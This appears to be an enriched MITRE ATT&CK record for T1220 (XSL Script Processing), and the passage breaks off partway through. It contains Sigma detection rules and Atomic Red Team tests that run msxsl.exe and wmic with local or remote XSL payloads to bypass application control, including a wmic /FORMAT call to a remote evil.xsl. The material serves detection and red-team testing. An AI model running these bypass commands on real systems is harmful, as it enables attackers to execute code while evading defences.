{
    "id": "T1220",
    "name": "XSL Script Processing",
    "description": "Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. (Citation: Microsoft XSLT Script Mar 2017)\nAdversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to [Trusted Developer Utilities Proxy Execution](T1127), the Microsoft common line transformation utility binary (msxsl.exe) (Citation: Microsoft msxsl.exe) can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. (Citation: Penetration Testing Lab MSXSL July 2017) Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. (Citation: Reaqta MSXSL Spearphishing MAR 2018) Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.(Citation: XSL Bypass Mar 2019)\nCommand-line examples:(Citation: Penetration Testing Lab MSXSL July 2017)(Citation: XSL Bypass Mar 2019)\n* `msxsl.exe customers[.]xml script[.]xsl`\n* `msxsl.exe script[.]xsl script[.]xsl`\n* `msxsl.exe script[.]jpeg script[.]jpeg`\nAnother variation of this technique, dubbed “Squiblytwo”, involves using [Windows Management Instrumentation](T1047) to invoke JScript or VBScript within an XSL file.(Citation: LOLBAS Wmic) This technique can also execute local/remote scripts and, similar to its [Regsvr32](T1218.010)/ \"Squiblydoo\" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in [Windows Management Instrumentation](T1047) provided they utilize the /FORMAT switch.(Citation: XSL Bypass Mar 2019)\nCommand-line examples:(Citation: XSL Bypass Mar 2019)(Citation: LOLBAS Wmic)\n* Local File: `wmic process list /FORMAT:evil[.]xsl`\n* Remote File: `wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”`",
    "platforms": "Windows",
    "kill_chain_phases": "Defense Evasion",
    "data_sources": "Process: Process Creation, Module: Module Load",
    "detection": "Use process monitoring to monitor the execution and arguments of msxsl.exe and wmic.exe. Compare recent invocations of these utilities with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity (ex: URL command line arguments, creation of external network connections, loading of DLLs associated with scripting). (Citation: LOLBAS Wmic) (Citation: Twitter SquiblyTwo Detection APR 2018) Command arguments used before and after the script invocation may also be useful in determining the origin and purpose of the payload being loaded.\nThe presence of msxsl.exe or other utilities that enable proxy execution that are typically used for development, debugging, and reverse engineering on a system that is not used for these purposes may be suspicious.",
    "url": "https://attack.mitre.org/techniques/T1220",
    "enrichments": {
        "attack_rule_map": [
            {
                "tech_id": "T1220",
                "atomic_attack_guid": "7f5be499-33be-4129-a560-66021f379b9b",
                "atomic_attack_name": "WMIC bypass using remote XSL file",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "XSL Script Execution Via WMIC.EXE",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_wmic_xsl_script_processing.yml",
                        "remote_content": "title: XSL Script Execution Via WMIC.EXE\nid: 05c36dd6-79d6-4a9a-97da-3db20298ab2d\nstatus: test\ndescription: |\n    Detects the execution of WMIC with the \"format\" flag to potentially load XSL files.\n    Adversaries abuse this functionality to execute arbitrary files while potentially bypassing application whitelisting defenses.\n    Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1220/T1220.md\nauthor: Timur Zinniatullin, oscd.community, Swachchhanda Shrawan Poudel\ndate: 2019-10-21\nmodified: 2024-03-05\ntags:\n    - attack.defense-evasion\n    - attack.t1220\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\wmic.exe'\n        CommandLine|contains|windash: '-format'     # wmic process list -FORMAT /? or wmic process list /FORMAT /?\n    filter_main_known_format:\n        CommandLine|contains:\n            - 'Format:List'\n            - 'Format:htable'\n            - 'Format:hform'\n            - 'Format:table'\n            - 'Format:mof'\n            - 'Format:value'\n            - 'Format:rawxml'\n            - 'Format:xml'\n            - 'Format:csv'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - WMIC.exe FP depend on scripts and administrative methods used in the monitored environment.\n    - Static format arguments - https://petri.com/command-line-wmi-part-3\nlevel: medium\n"
                    },
                    {
                        "rule_name": "Process Reconnaissance Via Wmic.EXE",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_wmic_recon_process.yml",
                        "remote_content": "title: Process Reconnaissance Via Wmic.EXE\nid: 221b251a-357a-49a9-920a-271802777cc0\nstatus: test\ndescription: Detects the execution of \"wmic\" with the \"process\" flag, which adversary might use to list processes running on the compromised host or list installed software hotfixes and patches.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1047/T1047.md\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wmic\nauthor: frack113\ndate: 2022-01-01\nmodified: 2023-02-14\ntags:\n    - attack.execution\n    - attack.t1047\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\WMIC.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains: 'process'\n    filter_main_creation:\n        CommandLine|contains|all:\n            # Rule id 526be59f-a573-4eea-b5f7-f0973207634d for `wmic process call create #{process_to_execute}`\n            - 'call'\n            - 'create'\n    condition: all of selection* and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
                    }
                ]
            },
            {
                "tech_id": "T1220",
                "atomic_attack_guid": "1b237334-3e21-4a0c-8178-b8c996124988",
                "atomic_attack_name": "WMIC bypass using local XSL file",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "XSL Script Execution Via WMIC.EXE",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_wmic_xsl_script_processing.yml",
                        "remote_content": "title: XSL Script Execution Via WMIC.EXE\nid: 05c36dd6-79d6-4a9a-97da-3db20298ab2d\nstatus: test\ndescription: |\n    Detects the execution of WMIC with the \"format\" flag to potentially load XSL files.\n    Adversaries abuse this functionality to execute arbitrary files while potentially bypassing application whitelisting defenses.\n    Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1220/T1220.md\nauthor: Timur Zinniatullin, oscd.community, Swachchhanda Shrawan Poudel\ndate: 2019-10-21\nmodified: 2024-03-05\ntags:\n    - attack.defense-evasion\n    - attack.t1220\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\wmic.exe'\n        CommandLine|contains|windash: '-format'     # wmic process list -FORMAT /? or wmic process list /FORMAT /?\n    filter_main_known_format:\n        CommandLine|contains:\n            - 'Format:List'\n            - 'Format:htable'\n            - 'Format:hform'\n            - 'Format:table'\n            - 'Format:mof'\n            - 'Format:value'\n            - 'Format:rawxml'\n            - 'Format:xml'\n            - 'Format:csv'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - WMIC.exe FP depend on scripts and administrative methods used in the monitored environment.\n    - Static format arguments - https://petri.com/command-line-wmi-part-3\nlevel: medium\n"
                    },
                    {
                        "rule_name": "Process Reconnaissance Via Wmic.EXE",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_wmic_recon_process.yml",
                        "remote_content": "title: Process Reconnaissance Via Wmic.EXE\nid: 221b251a-357a-49a9-920a-271802777cc0\nstatus: test\ndescription: Detects the execution of \"wmic\" with the \"process\" flag, which adversary might use to list processes running on the compromised host or list installed software hotfixes and patches.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1047/T1047.md\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wmic\nauthor: frack113\ndate: 2022-01-01\nmodified: 2023-02-14\ntags:\n    - attack.execution\n    - attack.t1047\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\WMIC.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains: 'process'\n    filter_main_creation:\n        CommandLine|contains|all:\n            # Rule id 526be59f-a573-4eea-b5f7-f0973207634d for `wmic process call create #{process_to_execute}`\n            - 'call'\n            - 'create'\n    condition: all of selection* and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
                    }
                ]
            }
        ],
        "cycat": {
            "cycat": {
                "cycat_related_uuids": [
                    "06ce37c2-61ab-4f05-9ff5-b1a96d18ae32",
                    "ebbe170d-aa74-4946-8511-9921243415a3",
                    "7708ac15-4beb-4863-a1a5-da2d63fb8a3c",
                    "05c36dd6-79d6-4a9a-97da-3db20298ab2d",
                    "8d63dadf-b91b-4187-87b6-34a1114577ea"
                ],
                "lookup_results": [
                    {
                        "uuid": "06ce37c2-61ab-4f05-9ff5-b1a96d18ae32",
                        "lookup_data": {
                            "description": "Detects threat actors proxy executing code and bypassing application controls by leveraging wmic and the `/FORMAT` argument switch to download and execute an XSL file (i.e js, vbs, etc).",
                            "raw": "author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research)\ndate: 2020/10/17\ndescription: Detects threat actors proxy executing code and bypassing application\n  controls by leveraging wmic and the `/FORMAT` argument switch to download and execute\n  an XSL file (i.e js, vbs, etc).\ndetection:\n  condition: selection\n  selection:\n    ImageLoaded|endswith:\n    - \\jscript.dll\n    - \\vbscript.dll\n    Image|endswith: \\wmic.exe\nfalsepositives:\n- The command wmic os get lastboottuptime loads vbscript.dll\n- The command wmic os get locale loads vbscript.dll\n- Since the ImageLoad event doesn't have enough information in this case. It's better\n  to look at the recent process creation events that spawned the WMIC process and\n  investigate the command line and parent/child processes to get more insights\nid: 06ce37c2-61ab-4f05-9ff5-b1a96d18ae32\nlevel: medium\nlogsource:\n  category: image_load\n  product: windows\nmodified: 2022/10/13\nreferences:\n- https://securitydatasets.com/notebooks/small/windows/05_defense_evasion/SDWIN-201017061100.html\n- https://twitter.com/dez_/status/986614411711442944\n- https://lolbas-project.github.io/lolbas/Binaries/Wmic/\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1220\ntitle: WMIC Loading Scripting Libraries\n",
                            "sigma:id": "06ce37c2-61ab-4f05-9ff5-b1a96d18ae32",
                            "title": "WMIC Loading Scripting Libraries",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "ebbe170d-aa74-4946-8511-9921243415a3",
                        "lookup_data": {
                            "mitre-attack-id": "T1220",
                            "mitre-cti:description": "Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. (Citation: Microsoft XSLT Script Mar 2017)\n\nAdversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to [Trusted Developer Utilities Proxy Execution](https://attack.mitre.org/techniques/T1127), the Microsoft common line transformation utility binary (msxsl.exe) (Citation: Microsoft msxsl.exe) can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. (Citation: Penetration Testing Lab MSXSL July 2017) Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. (Citation: Reaqta MSXSL Spearphishing MAR 2018) Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.(Citation: XSL Bypass Mar 2019)\n\nCommand-line examples:(Citation: Penetration Testing Lab MSXSL July 2017)(Citation: XSL Bypass Mar 2019)\n\n* <code>msxsl.exe customers[.]xml script[.]xsl</code>\n* <code>msxsl.exe script[.]xsl script[.]xsl</code>\n* <code>msxsl.exe script[.]jpeg script[.]jpeg</code>\n\nAnother variation of this technique, dubbed “Squiblytwo”, involves using [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) to invoke JScript or VBScript within an XSL file.(Citation: LOLBAS Wmic) This technique can also execute local/remote scripts and, similar to its [Regsvr32](https://attack.mitre.org/techniques/T1218/010)/ \"Squiblydoo\" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) provided they utilize the /FORMAT switch.(Citation: XSL Bypass Mar 2019)\n\nCommand-line examples:(Citation: XSL Bypass Mar 2019)(Citation: LOLBAS Wmic)\n\n* Local File: <code>wmic process list /FORMAT:evil[.]xsl</code>\n* Remote File: <code>wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”</code>",
                            "mitre-cti:name": "XSL Script Processing",
                            "mitre-cti:type": "attack-pattern",
                            "raw": "{'x_mitre_platforms': ['Windows'], 'x_mitre_domains': ['enterprise-attack'], 'x_mitre_contributors': ['Avneet Singh', 'Casey Smith', 'Praetorian'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'type': 'attack-pattern', 'id': 'attack-pattern--ebbe170d-aa74-4946-8511-9921243415a3', 'created': '2018-10-17T00:14:20.652Z', 'x_mitre_version': '1.2', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1220', 'url': 'https://attack.mitre.org/techniques/T1220'}, {'source_name': 'Reaqta MSXSL Spearphishing MAR 2018', 'url': 'https://reaqta.com/2018/03/spear-phishing-campaign-leveraging-msxsl/', 'description': 'Admin. (2018, March 2). Spear-phishing campaign leveraging on MSXSL. Retrieved July 3, 2018.'}, {'source_name': 'Twitter SquiblyTwo Detection APR 2018', 'url': 'https://twitter.com/dez_/status/986614411711442944', 'description': 'Desimone, J. (2018, April 18). Status Update. Retrieved July 3, 2018.'}, {'source_name': 'LOLBAS Wmic', 'url': 'https://lolbas-project.github.io/lolbas/Binaries/Wmic/', 'description': 'LOLBAS. (n.d.). Wmic.exe. Retrieved July 31, 2019.'}, {'source_name': 'Microsoft msxsl.exe', 'url': 'https://www.microsoft.com/download/details.aspx?id=21714', 'description': 'Microsoft. (n.d.). Command Line Transformation Utility (msxsl.exe). Retrieved July 3, 2018.'}, {'source_name': 'Penetration Testing Lab MSXSL July 2017', 'url': 'https://pentestlab.blog/2017/07/06/applocker-bypass-msxsl/', 'description': 'netbiosX. (2017, July 6). AppLocker Bypass – MSXSL. Retrieved July 3, 2018.'}, {'source_name': 'XSL Bypass Mar 2019', 'url': 'https://medium.com/@threathuntingteam/msxsl-exe-and-wmic-exe-a-way-to-proxy-code-execution-8d524f642b75', 'description': 'Singh, A. (2019, March 14). MSXSL.EXE and WMIC.EXE — A Way to Proxy Code Execution. Retrieved August 2, 2019.'}, {'source_name': 'Microsoft XSLT Script Mar 2017', 'url': 'https://docs.microsoft.com/dotnet/standard/data/xml/xslt-stylesheet-scripting-using-msxsl-script', 'description': 'Wenzel, M. et al. (2017, March 30). XSLT Stylesheet Scripting Using <msxsl:script>. Retrieved July 3, 2018.'}], 'x_mitre_deprecated': False, 'revoked': False, 'description': 'Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. (Citation: Microsoft XSLT Script Mar 2017)\\n\\nAdversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to [Trusted Developer Utilities Proxy Execution](https://attack.mitre.org/techniques/T1127), the Microsoft common line transformation utility binary (msxsl.exe) (Citation: Microsoft msxsl.exe) can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. (Citation: Penetration Testing Lab MSXSL July 2017) Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. (Citation: Reaqta MSXSL Spearphishing MAR 2018) Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.(Citation: XSL Bypass Mar 2019)\\n\\nCommand-line examples:(Citation: Penetration Testing Lab MSXSL July 2017)(Citation: XSL Bypass Mar 2019)\\n\\n* <code>msxsl.exe customers[.]xml script[.]xsl</code>\\n* <code>msxsl.exe script[.]xsl script[.]xsl</code>\\n* <code>msxsl.exe script[.]jpeg script[.]jpeg</code>\\n\\nAnother variation of this technique, dubbed “Squiblytwo”, involves using [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) to invoke JScript or VBScript within an XSL file.(Citation: LOLBAS Wmic) This technique can also execute local/remote scripts and, similar to its [Regsvr32](https://attack.mitre.org/techniques/T1218/010)/ \"Squiblydoo\" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) provided they utilize the /FORMAT switch.(Citation: XSL Bypass Mar 2019)\\n\\nCommand-line examples:(Citation: XSL Bypass Mar 2019)(Citation: LOLBAS Wmic)\\n\\n* Local File: <code>wmic process list /FORMAT:evil[.]xsl</code>\\n* Remote File: <code>wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”</code>', 'modified': '2022-05-05T05:04:14.238Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'name': 'XSL Script Processing', 'x_mitre_detection': 'Use process monitoring to monitor the execution and arguments of msxsl.exe and wmic.exe. Compare recent invocations of these utilities with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity (ex: URL command line arguments, creation of external network connections, loading of DLLs associated with scripting). (Citation: LOLBAS Wmic) (Citation: Twitter SquiblyTwo Detection APR 2018) Command arguments used before and after the script invocation may also be useful in determining the origin and purpose of the payload being loaded.\\n\\nThe presence of msxsl.exe or other utilities that enable proxy execution that are typically used for development, debugging, and reverse engineering on a system that is not used for these purposes may be suspicious.', 'kill_chain_phases': [{'phase_name': 'defense-evasion', 'kill_chain_name': 'mitre-attack'}], 'x_mitre_is_subtechnique': False, 'x_mitre_data_sources': ['Process: Process Creation', 'Module: Module Load'], 'x_mitre_system_requirements': ['Microsoft Core XML Services (MSXML) or access to wmic.exe'], 'x_mitre_defense_bypassed': ['Anti-virus', 'Digital Certificate Validation', 'Application Control'], 'x_mitre_attack_spec_version': '2.1.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5'}",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "7708ac15-4beb-4863-a1a5-da2d63fb8a3c",
                        "lookup_data": {
                            "mitre-attack-id": "T1220",
                            "mitre-cti:description": "[Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and/or msxsl.exe may or may not be used within a given environment. Disabling WMI may cause system instability and should be evaluated to assess the impact to a network. If msxsl.exe is unnecessary, then block its execution to prevent abuse by adversaries.",
                            "mitre-cti:name": "XSL Script Processing Mitigation",
                            "mitre-cti:type": "course-of-action",
                            "raw": "{'x_mitre_domains': ['enterprise-attack'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'id': 'course-of-action--7708ac15-4beb-4863-a1a5-da2d63fb8a3c', 'type': 'course-of-action', 'created': '2018-10-17T00:14:20.652Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'external_references': [{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/mitigations/T1220', 'external_id': 'T1220'}], 'modified': '2019-07-25T12:36:43.778Z', 'name': 'XSL Script Processing Mitigation', 'description': '[Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and/or msxsl.exe may or may not be used within a given environment. Disabling WMI may cause system instability and should be evaluated to assess the impact to a network. If msxsl.exe is unnecessary, then block its execution to prevent abuse by adversaries.', 'x_mitre_deprecated': True, 'x_mitre_version': '1.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5'}",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "05c36dd6-79d6-4a9a-97da-3db20298ab2d",
                        "lookup_data": {
                            "description": "Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. Rule detects when adversaries abuse this functionality to execute arbitrary files while potentially bypassing application whitelisting defenses.",
                            "raw": "author: Timur Zinniatullin, oscd.community\ndate: 2019/10/21\ndescription: Extensible Stylesheet Language (XSL) files are commonly used to describe\n  the processing and rendering of data within XML files. Rule detects when adversaries\n  abuse this functionality to execute arbitrary files while potentially bypassing\n  application whitelisting defenses.\ndetection:\n  condition: (selection_wmic and not false_positives) or selection_msxsl\n  false_positives:\n    CommandLine|contains:\n    - /Format:List\n    - /Format:htable\n    - /Format:hform\n    - /Format:table\n    - /Format:mof\n    - /Format:value\n    - /Format:rawxml\n    - /Format:xml\n    - /Format:csv\n  selection_msxsl:\n    Image|endswith: \\msxsl.exe\n  selection_wmic:\n    CommandLine|contains: /format\n    Image|endswith: \\wmic.exe\nfalsepositives:\n- WMIC.exe FP depend on scripts and administrative methods used in the monitored environment.\n- Msxsl.exe is not installed by default, so unlikely.\n- Static format arguments - https://petri.com/command-line-wmi-part-3\nid: 05c36dd6-79d6-4a9a-97da-3db20298ab2d\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/29\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1220/T1220.md\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1220\ntitle: XSL Script Processing\n",
                            "sigma:id": "05c36dd6-79d6-4a9a-97da-3db20298ab2d",
                            "title": "XSL Script Processing",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "8d63dadf-b91b-4187-87b6-34a1114577ea",
                        "lookup_data": {
                            "description": "Detects WMI SquiblyTwo Attack with possible renamed WMI by looking for imphash",
                            "raw": "author: Markus Neis, Florian Roth\ndate: 2019/01/16\ndescription: Detects WMI SquiblyTwo Attack with possible renamed WMI by looking for\n  imphash\ndetection:\n  condition: all of selection_org_* or all of selection_renamed_*\n  selection_org_cli:\n    CommandLine|contains|all:\n    - wmic\n    - format\n    - http\n  selection_org_img:\n  - Image|endswith: \\wmic.exe\n  - OriginalFileName: wmic.exe\n  selection_renamed_flags:\n    CommandLine|contains|all:\n    - 'format:'\n    - http\n  selection_renamed_wmic_imphash:\n  - Imphash:\n    - 1B1A3F43BF37B5BFE60751F2EE2F326E\n    - 37777A96245A3C74EB217308F3546F4C\n    - 9D87C9D67CE724033C0B40CC4CA1B206\n  - Hashes|contains:\n    - IMPHASH=1B1A3F43BF37B5BFE60751F2EE2F326E\n    - IMPHASH=37777A96245A3C74EB217308F3546F4C\n    - IMPHASH=9D87C9D67CE724033C0B40CC4CA1B206\nfalsepositives:\n- Unknown\nid: 8d63dadf-b91b-4187-87b6-34a1114577ea\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/11/11\nreferences:\n- https://subt0x11.blogspot.ch/2018/04/wmicexe-whitelisting-bypass-hacking.html\n- https://twitter.com/mattifestation/status/986280382042595328\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1047\n- attack.t1220\n- attack.execution\n- attack.t1059.005\n- attack.t1059.007\ntitle: SquiblyTwo Execution\n",
                            "sigma:id": "8d63dadf-b91b-4187-87b6-34a1114577ea",
                            "title": "SquiblyTwo Execution",
                            "_cycat_type": "Item"
                        }
                    }
                ]
            }
        },
        "atomics": [
            {
                "attack_technique": "T1220",
                "display_name": "XSL Script Processing",
                "atomic_tests": [
                    {
                        "name": "MSXSL Bypass using local files",
                        "auto_generated_guid": "ca23bfb2-023f-49c5-8802-e66997de462d",
                        "description": "Executes the code specified within a XSL script tag during XSL transformation using a local payload. \nRequires download of MSXSL. No longer available from Microsoft.\n(Available via Internet Archive https://web.archive.org/web/20200825011623/https://www.microsoft.com/en-us/download/details.aspx?id=21714 ) \nOpen Calculator.exe when test successfully executed, while AV turned off.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "xmlfile": {
                                "description": "Location of the test XML file on the local filesystem.",
                                "type": "path",
                                "default": "PathToAtomicsFolder\\T1220\\src\\msxslxmlfile.xml"
                            },
                            "xslfile": {
                                "description": "Location of the test XSL script file on the local filesystem.",
                                "type": "path",
                                "default": "PathToAtomicsFolder\\T1220\\src\\msxslscript.xsl"
                            },
                            "msxsl_exe": {
                                "description": "Location of the MSXSL executable.",
                                "type": "path",
                                "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\msxsl.exe"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "XML file must exist on disk at specified location (#{xmlfile})\n",
                                "prereq_command": "if (Test-Path \"#{xmlfile}\") {exit 0} else {exit 1}\n",
                                "get_prereq_command": "New-Item -Type Directory (split-path \"#{xmlfile}\") -ErrorAction Ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/msxslxmlfile.xml\" -OutFile \"#{xmlfile}\"\n"
                            },
                            {
                                "description": "XSL file must exist on disk at specified location (#{xslfile})\n",
                                "prereq_command": "if (Test-Path \"#{xslfile}\") {exit 0} else {exit 1}\n",
                                "get_prereq_command": "New-Item -Type Directory (split-path \"#{xslfile}\") -ErrorAction Ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/msxslscript.xsl\" -OutFile \"#{xslfile}\"\n"
                            },
                            {
                                "description": "msxsl.exe must exist on disk at specified location (#{msxsl_exe})\n",
                                "prereq_command": "if (Test-Path \"#{msxsl_exe}\") {exit 0} else {exit 1}\n",
                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://web.archive.org/web/20200803205229if_/https://download.microsoft.com/download/f/2/6/f263ac46-1fe9-4ae9-8fd3-21102100ebf5/msxsl.exe\" -OutFile \"#{msxsl_exe}\"\n"
                            }
                        ],
                        "executor": {
                            "command": "\"#{msxsl_exe}\" \"#{xmlfile}\" \"#{xslfile}\"\n",
                            "cleanup_command": "del \"#{msxsl_exe}\" >nul 2>&1\n",
                            "name": "command_prompt"
                        }
                    },
                    {
                        "name": "MSXSL Bypass using remote files",
                        "auto_generated_guid": "a7c3ab07-52fb-49c8-ab6d-e9c6d4a0a985",
                        "description": "Executes the code specified within a XSL script tag during XSL transformation using a remote payload.\nRequires download of MSXSL.exe. No longer available from Microsoft.\n(Available via Internet Archive https://web.archive.org/web/20200825011623/https://www.microsoft.com/en-us/download/details.aspx?id=21714 )\nOpen Calculator.exe when test successfully executed, while AV turned off.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "xmlfile": {
                                "description": "Remote location (URL) of the test XML file.",
                                "type": "url",
                                "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslxmlfile.xml"
                            },
                            "xslfile": {
                                "description": "Remote location (URL) of the test XSL script file.",
                                "type": "url",
                                "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslscript.xsl"
                            },
                            "msxsl_exe": {
                                "description": "Location of the MSXSL executable.",
                                "type": "path",
                                "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\msxsl.exe"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "msxsl.exe must exist on disk at specified location (\"#{msxsl_exe}\")\n",
                                "prereq_command": "if (Test-Path \"#{msxsl_exe}\") {exit 0} else {exit 1}\n",
                                "get_prereq_command": "Invoke-WebRequest \"https://web.archive.org/web/20200803205229if_/https://download.microsoft.com/download/f/2/6/f263ac46-1fe9-4ae9-8fd3-21102100ebf5/msxsl.exe\" -OutFile \"#{msxsl_exe}\"\n"
                            }
                        ],
                        "executor": {
                            "command": "\"#{msxsl_exe}\" \"#{xmlfile}\" \"#{xslfile}\"\n",
                            "cleanup_command": "del -Path #{msxsl_exe} >nul 2>&1\n",
                            "name": "command_prompt"
                        }
                    },
                    {
                        "name": "WMIC bypass using local XSL file",
                        "auto_generated_guid": "1b237334-3e21-4a0c-8178-b8c996124988",
                        "description": "Executes the code specified within a XSL script using a local payload.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "wmic_command": {
                                "description": "WMI command to execute using wmic.exe",
                                "type": "string",
                                "default": "process list"
                            },
                            "local_xsl_file": {
                                "description": "Location of the test XSL script file on the local filesystem.",
                                "type": "path",
                                "default": "PathToAtomicsFolder\\T1220\\src\\wmicscript.xsl"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "XSL file must exist on disk at specified location (#{local_xsl_file})\n",
                                "prereq_command": "if (Test-Path \"#{local_xsl_file}\") {exit 0} else {exit 1}\n",
                                "get_prereq_command": "New-Item -Type Directory (split-path \"#{local_xsl_file}\") -ErrorAction Ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/wmicscript.xsl\" -OutFile \"#{local_xsl_file}\"\n"
                            }
                        ],
                        "executor": {
                            "command": "wmic #{wmic_command} /FORMAT:\"#{local_xsl_file}\"\n",
                            "name": "command_prompt"
                        }
                    },
                    {
                        "name": "WMIC bypass using remote XSL file",
